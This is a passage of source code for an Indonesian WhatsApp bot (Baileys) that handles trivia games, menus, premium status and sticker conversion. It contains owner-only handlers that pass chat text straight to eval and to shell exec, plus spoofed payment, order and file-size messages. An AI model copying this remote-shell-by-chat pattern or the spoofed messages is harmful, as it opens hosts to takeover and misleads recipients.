           reply(`*Selamat Jawaban Kamu Benar 🎉*\n\nJawaban : ${getJawabanGame(from, tebakkimia)}\nHadiah : ${htgm} balance\n\nIngin bermain lagi? ketik *${prefix}tebakkimia*`)
           tebakkimia.splice(getGamePosi(from, tebakkimia), 1)
           }
        }
        cekWaktuGame(conn, tebaklirik) // Tebak Lirik
        if (isPlayGame(from, tebaklirik) && isUser) {
           if (chats.toLowerCase() == getJawabanGame(from, tebaklirik)) {
           var htgm = randomNomor(100, 150)
           addBalance(sender, htgm, balance)
           reply(`*Selamat Jawaban Kamu Benar 🎉*\n\nJawaban : ${getJawabanGame(from, tebaklirik)}\nHadiah : ${htgm} balance\n\nIngin bermain lagi? ketik *${prefix}tebaklirik*`)
           tebaklirik.splice(getGamePosi(from, tebaklirik), 1)
           }
        }
        cekWaktuGame(conn, kuis) // Kuis Game
        if (isPlayGame(from, kuis) && isUser) {
           if (chats.toLowerCase() == getJawabanGame(from, kuis)) {
           var htgm = randomNomor(100, 150)
           addBalance(sender, htgm, balance)
           reply(`*Selamat Jawaban Kamu Benar 🎉*\n\nJawaban : ${getJawabanGame(from, kuis)}\nHadiah : ${htgm} balance\n\nIngin bermain lagi? ketik *${prefix}kuis*`)
           kuis.splice(getGamePosi(from, kuis), 1)
           }
        }
        cekWaktuGame(conn, math) // Math Game
        if (isPlayGame(from, math) && isUser) {
           if (chats.toLowerCase() == getJawabanGame(from, math)) {
           var htgm = randomNomor(100, 150)
           addBalance(sender, htgm, balance)
           reply(`*Selamat Jawaban Kamu Benar 🎉*\n\nJawaban : ${getJawabanGame(from, math)}\nHadiah : ${htgm} balance\n\nIngin bermain lagi? ketik *${prefix}math*`)
           math.splice(getGamePosi(from, math), 1)
           }
        }
        
        //reach
const loadingMsg1 = {
react: {
text: "🕐", // use an empty string to remove the reaction
key: msg.key
}
}

const loadingMsg2 = {
react: {
text: "🕒", // use an empty string to remove the reaction
key: msg.key

}
}

const loadingMsg3 = {
react: {
text: "🕓", // use an empty string to remove the reaction
key: msg.key
}
}

const loadingMsg4 = {
react: {
text: "🕕", // use an empty string to remove the reaction
key: msg.key
}
}

const loadingMsg5 = {
react: {
text: "🕖", // use an empty string to remove the reaction
key: msg.key
}
}

const loadingMsg6 = {
react: {
text: "🕘", // use an empty string to remove the reaction
key: msg.key
}
}

const loadingMsg7 = {
react: {
text: "🕙", // use an empty string to remove the reaction
key: msg.key
}
}

const loadingMsg = {
react: {
text: "🕛", // use an empty string to remove the reaction
key: msg.key
}
}

const loadingMsg0 = {
react: {
text: "", // use an empty string to remove the reaction
key: msg.key
}
}   

const wait = {
react: {
text: "⏳", // use an empty string to remove the reaction
key: msg.key
}	
}     

const done = {
react: {
text: "✅", // use an empty string to remove the reaction
key: msg.key
}
} 

const gak = {
react: {
text: "🚫", // use an empty string to remove the reaction
key: msg.key
}
}  
        
                // Anti Link
                if (isGroup && !isCreator && !isGroupAdmins && isBotGroupAdmins) {
               if (chats.startsWith('http') && chats.startsWith('https')) {
               reply(`apalah?, kirim link gak jelas`)
               if (!isBotAdmins) return reply(`botAdmin`)
               if (isAdmins) return reply(`sory adminn`)
               if (isCreator) return reply(`kamu owner ku 🥰`)
               conn.sendMessage(from, { delete: msg.key })
            }
        }

		if (chats.startsWith("> ") && isCreator) {
		console.log(color('[EVAL]'), color(moment(msg.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`Dari Owner aowkoakwoak`))
		  const ev = (sul) => {
            var sat = JSON.stringify(sul, null, 2)
            var bang = util.format(sat)
            if (sat == undefined) {
              bang = util.format(sul)
            }
            return reply(bang)
          }
          try {
           reply(util.format(eval(`;(async () => { ${chats.slice(2)} })()`)))
          } catch (e) {
           reply(util.format(e))
          }
		} else if (chats.startsWith("$ ") && isCreator) {
        console.log(color('[EXEC]'), color(moment(msg.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`Dari Owner aowkoakwoak`))
          exec(chats.slice(2), (err, stdout) => {
		    if (err) return reply(`${err}`)
		    if (stdout) reply(`${stdout}`)
		  })
        } else if (chats.startsWith("x ") && isCreator) {
	    console.log(color('[EVAL]'), color(moment(msg.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`Dari Owner aowkaokwoak`))
		 try {
	       let evaled = await eval(chats.slice(2))
		   if (typeof evaled !== 'string') evaled = require("util").inspect(evaled)
			reply(`${evaled}`)
		 } catch (err) {
		   reply(`${err}`)
		 }
		}
		
		// Logs;
		if (!isGroup && isCmd && !fromMe) {
			addBalance(sender, randomNomor(20), balance)
			console.log('vanz > [\x1b[1;32mMSG\x1b[1;37m]', color(`${pushname}`), 'di', color(`private chat :`))
		}
		if (!isGroup && isCmd && !fromMe) {
			addBalance(sender, randomNomor(20), balance)
			console.log('vanz > [\x1b[1;32mCMD\x1b[1;37m]', color(`${command} ${q ? q: '-' }`), color(args.length), color(moment(msg.messageTimestamp * 1000).format('DD/MM/YYYY HH:mm:ss'), 'green'))
		}
		if (isGroup && isCmd && !fromMe) {
			addBalance(sender, randomNomor(20), balance)
			console.log('vanz > [\x1b[1;32mMSG\x1b[1;37m]', color(pushname), 'di', color(groupName))
		}
		if (isGroup && isCmd && !fromMe) {
			addBalance(sender, randomNomor(20), balance)
			console.log('vanz > [\x1b[1;32mCMD\x1b[1;37m]', color(`${command} ${q ? q: '-' }`), color(args.length), color(moment(msg.messageTimestamp * 1000).format('DD/MM/YYYY HH:mm:ss'), 'yellow'))
		}

		switch(command) {
			// Main Menu
			case prefix+'menu2':
			case prefix+'help':
			     conn.sendMessage(from, loadingMsg1)
await sleep(300)
                conn.sendMessage(from, loadingMsg2)
await sleep(300)
                conn.sendMessage(from, loadingMsg3)
await sleep(300)
                conn.sendMessage(from, loadingMsg4)
await sleep(300)
                conn.sendMessage(from, loadingMsg5)
await sleep(300)
                conn.sendMessage(from, loadingMsg6)
await sleep(300)
                conn.sendMessage(from, loadingMsg7)
await sleep(300)
                conn.sendMessage(from, loadingMsg)
await sleep(600)
			    var teks = allmenu(sender, prefix, pushname, isOwner, isCreator, isPremium, balance, botName, limit, limitCount, glimit, gcount)
			    conn.sendMessage(from, {
                  text: teks, buttonsDefault, contextInfo: {
                    externalAdReply: {
                      title: `${botName} ~ by ${ownerName}`,
	                  body: botName,
	                  thumbnail: fs.readFileSync('./media/bg1.jpg'),
		              sourceUrl: hmm.wa,
		              mediaType: 289,
                      renderLargerThumbnail: false
                    }
                  }
                }, { quoted: msg })
                .then(res => {
                  return conn.sendMessage(from, { audio: fs.readFileSync(`./media/menu.mp3`), mimetype: 'audio/mpeg', ptt: true }, { quoted: res })
                })
				break
		    case prefix+'menu3':
                 var teks = allmenu(sender, prefix, pushname, isOwner, isCreator, isPremium, balance, botName, limit, limitCount, glimit, gcount)
                   conn.relayMessage(from,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'IDR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: teks,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                 break
            case prefix+'menu4':
                 var teks = allmenu(sender, prefix, pushname, isOwner, isCreator, isPremium, balance, botName, limit, limitCount, glimit, gcount)
                 var anuin = fs.readFileSync('./vanz_other/van.pdf')
                   conn.sendMessage(from, {
                        document: anuin,
                        caption: teks,
                        mimetype: 'application/pdf',
                        fileName: `${botName} x ${ownerName}`,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                             showAdAttribution: true,
                             title: `${botName} x ${ownerName}`,
                             body: `Vanz Turu`,
                             thumbnail: fs.readFileSync(pathimg1),
                             sourceUrl: hmm.linkmenu,
                             mediaType: 1,
                             renderLargerThumbnail: true
                           }
                         }
                      }, {
                         quoted: msg
                   })
                 break           
			case prefix+'listmenu':
			    await prata()
			    var teks = allmenu(sender, prefix, pushname, isOwner, isCreator, isPremium, balance, botName, limit, limitCount, glimit, gcount)
			conn.relayMessage(from, {
                        scheduledCallCreationMessage: {
                        callType: "AUDIO",
                        scheduledTimestampMs: 99999999999,
                        title: teks
                        }
                    }, { quoted: msg })
				break
			case prefix+'rules':
			    var teks = `Peraturan Penggunaan Bot :
- Dilarang Spam
- Dilarang Menelpon Bot
- Dilarang Mengirim Virus Ke Bot

Catatan :
Semua Fitur Bot Di Lakukan Secara Otomatis Oleh Sistem Tanpa
Ada Campur Tangan Owner, 
Dan Semua Informasimu Seperti Chat, Foto, Video Atau Vn 
Akan Aman Tanpa Di Sebar, Dan Jika Ada Balasan Yang Absurd Atau
Sticker Absurd Ya Mungkin Owner Lagi Gabut Dan Butuh Temen Chat :v`
                conn.sendMessage(from, { caption: teks, image: fs.readFileSync('./media/bg1.jpg') })
			    break
			case prefix+'botinfo':
			case prefix+'infobot':
                   var capt = `_*${botName} Information*_

*• Name :* ${botName}
*• Number :* ${botNumber.split("@")[0]}
*• Creator :* ${creatorNumber.split("@")[0]}
*• Total Pengguna :* ${pendaftar.length}
*• Baileys :* @whiskeysockets/baileys
*• Baileys Ver. :* 6.5.0
*• Prefix :* Multi Prefix
*• Instagram :* ${hmm.ig}
*• YouTube :* ${hmm.yt}`
                   conn.sendMessage(from, { caption: capt, image: fs.readFileSync('./media/bg.jpg'), mentions: [creatorNumber] })
                break
			case prefix+'mainmenu':
			    var teks = menumain(prefix)
			    conn.sendMessage(from, {
                  text: teks, contextInfo: {
                    externalAdReply: {
                      title: `${botName} ~ by ${ownerName}`,
	                  body: botName,
	                  thumbnail: fs.readFileSync('./media/bg1.jpg'),
		              sourceUrl: hmm.wa,
		              mediaType: 289,
                      renderLargerThumbnail: false
                    }
                  }
                }, { quoted: msg })
			    break
			case prefix+'convermenu':
			    var teks = menuconver(prefix)
			    conn.sendMessage(from, {
                  text: teks, contextInfo: {
                    externalAdReply: {
                      title: `${botName} ~ by ${ownerName}`,
	                  body: botName,
	                  thumbnail: fs.readFileSync('./media/bg1.jpg'),
		              sourceUrl: hmm.wa,
		              mediaType: 289,
                      renderLargerThumbnail: false
                    }
                  }
                }, { quoted: msg })
			    break
			case prefix+'toolsmenu':
			    var teks = menutools(prefix)
			    conn.sendMessage(from, {
                  text: teks, contextInfo: {
                    externalAdReply: {
                      title: `${botName} ~ by ${ownerName}`,
	                  body: botName,
	                  thumbnail: fs.readFileSync('./media/bg1.jpg'),
		              sourceUrl: hmm.wa,
		              mediaType: 289,
                      renderLargerThumbnail: false
                    }
                  }
                }, { quoted: msg })
			    break
			case prefix+'aimenu':
			    var teks = menuai(prefix)
			    conn.sendMessage(from, {
                  text: teks, contextInfo: {
                    externalAdReply: {
                      title: `${botName} ~ by ${ownerName}`,
	                  body: botName,
	                  thumbnail: fs.readFileSync('./media/bg1.jpg'),
		              sourceUrl: hmm.wa,
		              mediaType: 289,
                      renderLargerThumbnail: false
                    }
                  }
                }, { quoted: msg })
			    break
            case prefix+'bugmenu':
			    var teks = menubug(prefix)
			    conn.sendMessage(from, {
                  text: teks, contextInfo: {
                    externalAdReply: {
                      title: `${botName} ~ by ${ownerName}`,
	                  body: botName,
	                  thumbnail: fs.readFileSync('./media/bg1.jpg'),
		              sourceUrl: hmm.wa,
		              mediaType: 289,
                      renderLargerThumbnail: false
                    }
                  }
                }, { quoted: msg })
			    break
			case prefix+'stikermenu':
			case prefix+'stickermenu':
			case prefix+'smenu':
			    var teks = menustiker(prefix)
			    conn.sendMessage(from, {
                  text: teks, contextInfo: {
                    externalAdReply: {
                      title: `${botName} ~ by ${ownerName}`,
	                  body: botName,
	                  thumbnail: fs.readFileSync('./media/bg1.jpg'),
		              sourceUrl: hmm.wa,
		              mediaType: 289,
                      renderLargerThumbnail: false
                    }
                  }
                }, { quoted: msg })
			    break
			case prefix+'anonymous':
			    if (!isUser) return conn.sendMessage(from, gak)
			    var teks = menuanon(prefix)
			    conn.sendMessage(from, {
                  text: teks, contextInfo: {
                    externalAdReply: {
                      title: `${botName} ~ by ${ownerName}`,
	                  body: botName,
	                  thumbnail: fs.readFileSync('./media/bg1.jpg'),
		              sourceUrl: hmm.wa,
		              mediaType: 289,
                      renderLargerThumbnail: false
                    }
                  }
                }, { quoted: msg })
			    break
			case prefix+'downloadmenu':
			    var teks = menudownload(prefix)
			    conn.sendMessage(from, {
                  text: teks, contextInfo: {
                    externalAdReply: {
                      title: `${botName} ~ by ${ownerName}`,
	                  body: botName,
	                  thumbnail: fs.readFileSync('./media/bg1.jpg'),
		              sourceUrl: hmm.wa,
		              mediaType: 289,
                      renderLargerThumbnail: false
                    }
                  }
                }, { quoted: msg })
			    break
			case prefix+'randommenu':
			    var teks = menurandom(prefix)
			    conn.sendMessage(from, {
                  text: teks, contextInfo: {
                    externalAdReply: {
                      title: `${botName} ~ by ${ownerName}`,
	                  body: botName,
	                  thumbnail: fs.readFileSync('./media/bg1.jpg'),
		              sourceUrl: hmm.wa,
		              mediaType: 289,
                      renderLargerThumbnail: false
                    }
                  }
                }, { quoted: msg })
			    break
			case prefix+'searchmenu':
			    var teks = menusearch(prefix)
			    conn.sendMessage(from, {
                  text: teks, contextInfo: {
                    externalAdReply: {
                      title: `${botName} ~ by ${ownerName}`,
	                  body: botName,
	                  thumbnail: fs.readFileSync('./media/bg1.jpg'),
		              sourceUrl: hmm.wa,
		              mediaType: 289,
                      renderLargerThumbnail: false
                    }
                  }
                }, { quoted: msg })
			    break
			case prefix+'gamemenu':
			    var teks = menugame(prefix)
			    conn.sendMessage(from, {
                  text: teks, contextInfo: {
                    externalAdReply: {
                      title: `${botName} ~ by ${ownerName}`,
	                  body: botName,
	                  thumbnail: fs.readFileSync('./media/bg1.jpg'),
		              sourceUrl: hmm.wa,
		              mediaType: 289,
                      renderLargerThumbnail: false
                    }
                  }
                }, { quoted: msg })
			    break
			case prefix+'photooxy':
			case prefix+'textpro':
			case prefix+'tekspro':
			    var teks = menupo(prefix)
			    conn.sendMessage(from, {
                  text: teks, contextInfo: {
                    externalAdReply: {
                      title: `${botName} ~ by ${ownerName}`,
	                  body: botName,
	                  thumbnail: fs.readFileSync('./media/bg1.jpg'),
		              sourceUrl: hmm.wa,
		              mediaType: 289,
                      renderLargerThumbnail: false
                    }
                  }
                }, { quoted: msg })
			    break
			case prefix+'pay':
			    var teks = menupb(prefix)
			    conn.sendMessage(from, {
                  text: teks, contextInfo: {
                    externalAdReply: {
                      title: `${botName} ~ by ${ownerName}`,
	                  body: botName,
	                  thumbnail: fs.readFileSync('./media/bg1.jpg'),
		              sourceUrl: hmm.wa,
		              mediaType: 289,
                      renderLargerThumbnail: false
                    }
                  }
                }, { quoted: msg })
			    break
			case prefix+'religion':
			case prefix+'islamicmenu':
			    var teks = menureligion(prefix)
			    conn.sendMessage(from, {
                  text: teks, contextInfo: {
                    externalAdReply: {
                      title: `${botName} ~ by ${ownerName}`,
	                  body: botName,
	                  thumbnail: fs.readFileSync('./media/bg1.jpg'),
		              sourceUrl: hmm.wa,
		              mediaType: 289,
                      renderLargerThumbnail: false
                    }
                  }
                }, { quoted: msg })
			    break
			case prefix+'groupmenu':
			    if (!isGroup) return conn.sendMessage(from, gak)
await sleep(100)
			    var teks = menugrup(prefix)
			    conn.sendMessage(from, {
                  text: teks, contextInfo: {
                    externalAdReply: {
                      title: `Group Menu`,
	                  body: botName,
	                  thumbnail: fs.readFileSync('./media/bg1.jpg'),
		              sourceUrl: hmm.wa,
		              mediaType: 289,
                      renderLargerThumbnail: false
                    }
                  }
                }, { quoted: msg })
			    break
			case prefix+'ownermenu':
			    if (!isOwner && !isCreator) return conn.sendMessage(from, gak)
await sleep(100)
			    var teks = menuowner(prefix)
			    conn.sendMessage(from, {
                  text: teks, contextInfo: {
                    externalAdReply: {
                      title: `Owner Menu`,
	                  body: botName,
	                  thumbnail: fs.readFileSync('./media/bg1.jpg'),
		              sourceUrl: hmm.linkmenu,
		              mediaType: 289,
                      renderLargerThumbnail: false
                    }
                  }
                }, { quoted: msg })
			    break
			case '?': {
                conn.sendPoll(from, "List Menu", ['allmenu','MenuGroup','MenuDownload','MenuSearch','MenuRandom','MenuMaker','MenuFun','MenuPrimbon','MenuConvert','MenuMain','MenuOwner'])
            }
            break
			case prefix+'allmenu':
			    await loading()
		  	var teks = menuall(sender, prefix, pushname, isOwner, isCreator, isPremium, balance, botName, limit, limitCount, glimit, gcount)
               conn.sendMessage(from, {
                      text: teks, contextInfo: { 
                        mentionedJid: [sender],
                        externalAdReply : { 
                        title: `All Menu - ${botName}`, 
                        body: `asu`,
                        mediaType: 289, 
                        thumbnail: fs.readFileSync(pathimg),
                        sourceUrl: hmm.linkmenu
                       }
                    }
                 }, { quoted: msg })
			    break
			case prefix+'runtime':
			    reply(`${botName} aktif selama ${runtime(process.uptime())}`)
			    break
			case prefix+'idgc':
			    reply(`${from}`)
			    break
			case prefix+'menu':
			    var ppnya = await conn.profilePictureUrl(sender, "image").catch(() => 'https://telegra.ph/file/6880771a42bad09dd6087.jpg')
			    var anu = `*${botName}* ᴀᴅᴀʟᴀʜ ᴘʀᴏɢʀᴀᴍ ʙᴏᴛ ᴡʜᴀᴛꜱᴀᴘᴘ ʏᴀɴɢ ꜱɪᴀᴘ ᴍᴇᴍʙᴀɴᴛᴜ ᴀɴᴅᴀ ᴅᴀʟᴀᴍ ᴍᴇʟᴀᴋᴜᴋᴀɴ ʙᴇʀʙᴀɢᴀɪ ᴛɪɴᴅᴀᴋᴀɴ, ᴍᴇɴᴄᴀʀɪ ᴅᴀᴛᴀ ᴀᴛᴀᴜ ɪɴꜰᴏʀᴍᴀꜱɪ ᴍᴇʟᴀʟᴜɪ ᴡʜᴀᴛꜱᴀᴘᴘ.

– *Info Bot*
• *Creator*: ${ownerName}
• *Bot Name*: ${botName}
• *Version*: 5
• *Baileys*: @whiskeysockets/baileys
• *Ver. Baileys*: 6.5.0
• *Prefix*: Multi Prefix
• *qrcode/pairing_code*: pairing_code 
• *runtime*: ${runtime(process.uptime())}

- *Menu List*
◦ ${prefix}listmenu
◦ ${prefix}allmenu`
                conn.sendMessage(from, {
                  text: anu, contextInfo: {
                    externalAdReply: {
                      title: `5 - ${botName}`,
	                  body: botName,
	                  thumbnailUrl: ppnya,
		              mediaType: 1,
                      renderLargerThumbnail: true
                    }
                  }
                }, { quoted: msg })
			    break
			case 'p':
			    reply(`apa`)
			    break
			case prefix+'p':
			    var teks = `apa`
			    conn.sendMessage(from, {
                      text: teks, contextInfo:{ 
                        externalAdReply : { 
                        title: `Hallo Kak`, 
                        body: `Mampir Website Di Bawah Yaa`,
                        previewType: "PHOTO", 
                        thumbnail: fs.readFileSync(pathimg),
                        sourceUrl: `https://wa.me/6283857092641`
                       }
                    }
                 }, { quoted: msg })
			    break
			case prefix+'test2':
			    conn.sendMessage(from, {
              	   orderMessage: {
                        orderId: "436664297902534",
                        sellerJid: "6283857092641@s.whatsapp.net",
                        itemCount: 9999999,
                        status: "INQUIRY",
                        surface: "CATALOG",
                        message: ` POWERED BY Vanz? `,
                        orderTitle: "POWERED BY Vanz?",
                        thumbnail: fs.readFileSync(pathimg),
                        token: "AR6ew8v8oH4gt78Ufm/sMBCeaQJwJlDhOTto8qAZytAdQA=="
                       }
                }, {
                    quoted: msg
                })
			    break
			case 'tqto':
                reply(`*Terima Kasih Kepada*\n\n>| 1. Vanz? ( Author )\n>| 2. LoL Human ( Rest APIs )\n>| 2. Zeltoria ( Rest APIs )\n>| 3. X-Code Api ( Rest APIs )\n>| 4. Penyedia Module\n>| 5. Subscriber & Creator Bot WhatsApp\n\n\n\n\n\n Powered By Vanz?`)
                break
			case prefix+'speed':
               let timestamp = speed();
               let latensi = speed() - timestamp
               reply(`${latensi.toFixed(4)} Second`)
               break
			case prefix+'donate':
			case prefix+'donasi':
			    reply(`──「 MENU DONATE 」──\n\nHi ${pushname} 👋🏻\n\`\`\`DANA : ${setting.donasi.dana}\`\`\`\n\`\`\`GOPAY : ${setting.donasi.gopay}\`\`\`\nTerimakasih untuk kamu yang sudah donasi untuk perkembangan bot ini _^\n──「 THX FOR YOU ! 」──`)
			    break
            case prefix +'kontak':
                   var number = '6283857092641'
                   var number1 = '6281575886399'
                   var vcard = `BEGIN:VCARD\n
VERSION:3.0\n
N: Vanz?\n
FN: CerdasBot MD\n
item1.TEL;waid=${number}:${number1}\n
item1.X-ABLabel:Ponsel\n
item2.EMAIL;type=INTERNET:creator@broucast\n
item2.X-ABLabel:Email\n
item3.URL:https://api.xcodeteam.xyz\n
item3.X-ABLabel:Profile Website\n
item4.ADR:;;Indonesia;;;;\n
item4.X-ABLabel:Region\n
END:VCARD`
                   conn.sendMessage(from, { contacts: { displayName: 'Owner of '+botName.split(' ')[0], contacts: [{ vcard }] }},{ quoted: {key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: `status@broadcast` } : {}) }, message: { conversation: ` Kontak : ${pushname}` }}})
                   break
            case prefix+'owner':
            case prefix+'creator': {
                conn.sendMessage(from, {
                    contacts: {
                        displayName: `${list.length} Kontak`,
                        contacts: list
                    }
                }, {
                    quoted: msg
                })
            }
            break
			case prefix+'report':
			     var teks = `${q}`
			      conn.sendMessage(creatorNumber, {
                   text: teks
                }, { 
                    quoted: msg 
                })
				break
			case prefix+'creator':
                   var number = ownerNumber.replace(/[^0-9]/g, '')
                   var vcard = 'BEGIN:VCARD\n'
                   + 'VERSION:3.0\n'
                   + 'FN:Owner of ' + botName + '\n'
                   + 'ORG:https://wa.me/VanzDariBarat;\n'
                   + 'TEL;type=CELL;type=VOICE;waid=' + number + ':+' + number + '\n'
                   + 'END:VCARD'
                   conn.sendMessage(from, { contacts: { displayName: 'Owner of '+botName.split(' ')[0], contacts: [{ vcard }] }},{ quoted: msg })
                   break
			case prefix+'cekprem':
            case prefix+'cekpremium':
                if (!isPremium) return reply(`Kamu bukan user premium, kirim perintah *${prefix}daftarprem* untuk membeli premium`)
                if (isOwner) return reply(`Lu owner bego!`)
                if (isCreator) return reply(`Lu Creator!`)
                if (_prem.getPremiumExpired(sender, premium) == "PERMANENT") return reply(`PERMANENT`)
                let cekvip = ms(_prem.getPremiumExpired(sender, premium) - Date.now())
                let premiumnya = `*Expire :* ${cekvip.days} day(s) ${cekvip.hours} hour(s) ${cekvip.minutes} minute(s)`
                reply(premiumnya)
                break
            case prefix+'listprem':
                let txt = `List Prem\nJumlah : ${premium.length}\n\n`
                let men = [];
                for (let i of premium) {
                    men.push(i.id)
                    txt += `*ID :* @${i.id.split("@")[0]}\n`
                  if (i.expired === 'PERMANENT') {
                    let cekvip = 'PERMANENT'
                    txt += `*Expire :* PERMANENT\n\n`
                  } else {
                    let cekvip = ms(i.expired - Date.now())
                    txt += `*Expire :* ${cekvip.days} day(s) ${cekvip.hours} hour(s) ${cekvip.minutes} minute(s) ${cekvip.seconds} second(s)\n\n`
                  }
                }
                mentions(txt, men, true)
                break
	        // Converter & Tools Menu
			case prefix+'sticker': case prefix+'stiker': case prefix+'s':
			    if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
				if (isImage || isQuotedImage) {
		           var stream = await downloadContentFromMessage(msg.message.imageMessage || msg.message.extendedTextMessage?.contextInfo.quotedMessage.imageMessage, 'image')
			       var buffer = Buffer.from([])
			       for await(const chunk of stream) {
			          buffer = Buffer.concat([buffer, chunk])
			       }
			       var rand1 = 'sticker/'+getRandom('.jpg')
			       var rand2 = 'sticker/'+getRandom('.webp')
			       fs.writeFileSync(`./${rand1}`, buffer)
			       ffmpeg(`./${rand1}`)
				.on("error", console.error)
				.on("end", () => {
				  exec(`webpmux -set exif ./sticker/data.exif ./${rand2} -o ./${rand2}`, async (error) => {
				    conn.sendMessage(from, { sticker: fs.readFileSync(`./${rand2}`) }, { quoted: msg })
				    limitAdd(sender, limit)
					fs.unlinkSync(`./${rand1}`)
			            fs.unlinkSync(`./${rand2}`)
			          })
				 })
				.addOutputOptions(["-vcodec", "libwebp", "-vf", "scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse"])
				.toFormat('webp')
				.save(`${rand2}`)
			    } else if (isVideo || isQuotedVideo) {
				 var stream = await downloadContentFromMessage(msg.message.imageMessage || msg.message.extendedTextMessage?.contextInfo.quotedMessage.videoMessage, 'video')
				 var buffer = Buffer.from([])
				 for await(const chunk of stream) {
				   buffer = Buffer.concat([buffer, chunk])
				 }
			     var rand1 = 'sticker/'+getRandom('.mp4')
				 var rand2 = 'sticker/'+getRandom('.webp')
			         fs.writeFileSync(`./${rand1}`, buffer)
			         ffmpeg(`./${rand1}`)
				  .on("error", console.error)
				  .on("end", () => {
				    exec(`webpmux -set exif ./sticker/data.exif ./${rand2} -o ./${rand2}`, async (error) => {
				      conn.sendMessage(from, { sticker: fs.readFileSync(`./${rand2}`) }, { quoted: msg })
				      limitAdd(sender, limit)
					  fs.unlinkSync(`./${rand1}`)
				      fs.unlinkSync(`./${rand2}`)
				    })
				  })
				 .addOutputOptions(["-vcodec", "libwebp", "-vf", "scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse"])
				 .toFormat('webp')
				 .save(`${rand2}`)
                } else {
			       reply(`Kirim gambar/vidio dengan caption ${command} atau balas gambar/vidio yang sudah dikirim\nNote : Maximal vidio 10 detik!`)
			    }
                break
			case prefix+'toimg': case prefix+'toimage':
            case prefix+'tovid': case prefix+'tovideo':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (!isQuotedSticker) return reply(`Reply stikernya!`)
                var stream = await downloadContentFromMessage(msg.message.extendedTextMessage?.contextInfo.quotedMessage.stickerMessage, 'sticker')
                var buffer = Buffer.from([])
                for await(const chunk of stream) {
                   buffer = Buffer.concat([buffer, chunk])
                }
                var rand1 = 'sticker/'+getRandom('.webp')
                var rand2 = 'sticker/'+getRandom('.png')
                fs.writeFileSync(`./${rand1}`, buffer)
                if (isQuotedSticker && msg.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.isAnimated !== true) {
                reply(mess.wait)
                exec(`ffmpeg -i ./${rand1} ./${rand2}`, (err) => {
                   fs.unlinkSync(`./${rand1}`)
                   if (err) return reply(mess.error.api)
                   conn.sendMessage(from, { image: fs.readFileSync(`./${rand2}`) }, { quoted: msg })
                   limitAdd(sender, limit)
                   fs.unlinkSync(`./${rand2}`)
                 })
                 } else {
                    reply(mess.wait)
                    webp2mp4File(`./${rand1}`).then(async(data) => {
                    fs.unlinkSync(`./${rand1}`)
                    conn.sendMessage(from, { video: await getBuffer(data.data) }, { quoted: msg })
                    limitAdd(sender, limit)
                  })
                }
                break
            case prefix+'tomp3': case prefix+'toaudio':
                   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                   if (isVideo || isQuotedVideo) {
                     let media = await downloadAndSaveMediaMessage(msg, 'video', `./sticker/${Date.now()}.mp4`)
                     reply(mess.wait)
                     let ran = './sticker/'+getRandom('.mp3')
                     exec(`ffmpeg -i ${media} ${ran}`, async (err) => {
                       fs.unlinkSync(media)
                       if (err) { fs.unlinkSync(ran); return reply('Gagal :V') }
                       conn.sendMessage(from, { audio: fs.readFileSync(ran),  mimetype: 'audio/mp4', fileName: `${sender.split("@")[0]}ToMp3`, ptt: args[1] == '--ptt' ? true : false }, { quoted: msg })
                       limitAdd(sender, limit)
                       fs.unlinkSync(ran)
                     })
                   } else {
                     reply(`Kirim/reply video dengan caption ${command} atau ${command} --ptt`)
                   }
                   break
             case prefix+'ttp':
                   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                   if (args.length < 2) return reply(`Kirim perintah *${prefix}ttp* teks`)
                   if (q.length > 75) return reply(`Teksnya kepanjangan`)
                   conn.sendMessage(from, wait)
await sleep(200)
                   getBuffer(`https://aemt.me/ttp?text=${q}`)
                   .then( res => {
                     if (res == undefined) return reply(mess.error.api)
                     conn.sendImageAsSticker(from, res, msg, { packname, author })
                     limitAdd(sender, limit)
                   }).catch(() => reply(mess.error.api))
                   break
             case prefix+'attp':
                   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                   if (args.length < 2) return reply(`Kirim perintah *${prefix}ttp* teks`)
                   if (q.length > 75) return reply(`Teksnya kepanjangan`)
                   conn.sendMessage(from, wait)
await sleep(200)
                   getBuffer(`https://aemt.me/attp?text=${q}`)
                   .then( res => {
                     if (res == undefined) return reply(mess.error.api)
                     conn.sendVideoAsSticker(from, res, msg, { packname, author })
                     limitAdd(sender, limit)
                   }).catch(() => reply(mess.error.api))
                   break
            case 'anticolong':
            case 'smeta':
            case 'stickermeta': {
                   if (isImage || isQuotedImage) {
                     var media = await downloadAndSaveMediaMessage(msg, 'image', `./sticker/${sender}.jpeg`)
                     var { addExif } = require('../lib/exif3')
                     var stick = await addExif(media, packname || '', author || 'Vanz Ganteng');
                  let encmedia = await conn.sendMessage(from, { sticker: stick }, { quoted: msg });
               }
            }
            break
            case prefix+'swm': case prefix+'wm': case prefix+'take': case prefix+'takestiker':
                case prefix+'stikerwm': case prefix+'stickerwm': case prefix+'takesticker':
